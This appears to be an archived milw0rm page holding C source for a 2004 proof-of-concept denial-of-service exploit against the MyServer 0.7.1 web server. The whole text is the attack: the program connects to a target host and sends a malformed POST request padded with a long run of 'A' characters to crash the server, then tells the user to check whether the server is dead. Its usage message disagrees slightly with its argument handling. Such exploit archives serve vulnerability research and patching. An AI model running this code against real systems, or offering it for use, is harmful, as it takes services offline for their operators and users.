<html><head><title>MyServer 0.7.1 (POST) Denial Of Service Exploit</title></head><pre>/****************************/ 
PoC to crash the server 
/****************************/ 

/* MyServer 0.7.1 POST Denial Of Service 
vendor URL: 
http://www.myserverproject.net 

coded and discovered by: 
badpack3t 
for .:sp research labs:. 
www.security-protocols.com 
9.20.2004 
Tested on Mandrake 10.0 

usage: 
sp-myserv-0.7.1 [targetport] (default is 80) 
*/ 

#include &lt;'winsock2.h&gt; 
#include &lt;'stdio.h&gt; 

#pragma comment(lib, &quot;ws2_32.lib&quot;) 

char exploit[] = 

&quot;POST index.html?View=Logon HTTP/1.1 &quot; 
&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot; 
&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot; 
&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot; 
&quot;: ihack.ms &quot;; 

int main(int argc, char *argv[]) 
{ 
WSADATA wsaData; 
WORD wVersionRequested; 
struct hostent *pTarget; 
struct sockaddr_in sock; 
char *target; 
int port,bufsize; 
SOCKET mysocket; 

if (argc &lt; 2) 
{ 
printf(&quot;MyServer 0.7.1 POST DoS by badpack3t &quot;, argv[0]); 
printf(&quot;Usage: %s [targetport] (default is 80) &quot;, argv[0]); 
printf(&quot;www.security-protocols.com &quot;, argv[0]); 
exit(1); 
} 

wVersionRequested = MAKEWORD(1, 1); 
if (WSAStartup(wVersionRequested, &amp;wsaData) &lt; 0) return -1; 

target = argv[1]; 
port = 80; 

if (argc &gt;= 3) port = atoi(argv[2]); 
bufsize = 1024; 
if (argc &gt;= 4) bufsize = atoi(argv[3]); 

mysocket = socket(AF_INET, SOCK_STREAM, 0); 
if(mysocket==INVALID_SOCKET) 
{ 
printf(&quot;Socket error! &quot;); 
exit(1); 
} 

printf(&quot;Resolving Hostnames... &quot;); 
if ((pTarget = gethostbyname(target)) == NULL) 
{ 
printf(&quot;Resolve of %s failed &quot;, argv[1]); 
exit(1); 
} 

memcpy(&amp;sock.sin_addr.s_addr, pTarget-&gt;h_addr, pTarget-&gt;h_length); 
sock.sin_family = AF_INET; 
sock.sin_port = htons((USHORT)port); 

printf(&quot;Connecting... &quot;); 
if ( (connect(mysocket, (struct sockaddr *)&amp;sock, sizeof (sock) ))) 
{ 
printf(&quot;Couldn't connect to host. &quot;); 
exit(1); 
} 

printf(&quot;Connected!... &quot;); 
printf(&quot;Sending Payload... &quot;); 
if (send(mysocket, exploit, sizeof(exploit)-1, 0) == -1) 
{ 
printf(&quot;Error Sending the Exploit Payload &quot;); 
closesocket(mysocket); 
exit(1); 
} 

printf(&quot;Payload has been sent! Check if the webserver is dead! &quot;); 
closesocket(mysocket); 
WSACleanup(); 
return 0; 
}

// milw0rm.com [2004-09-27]</pre></html>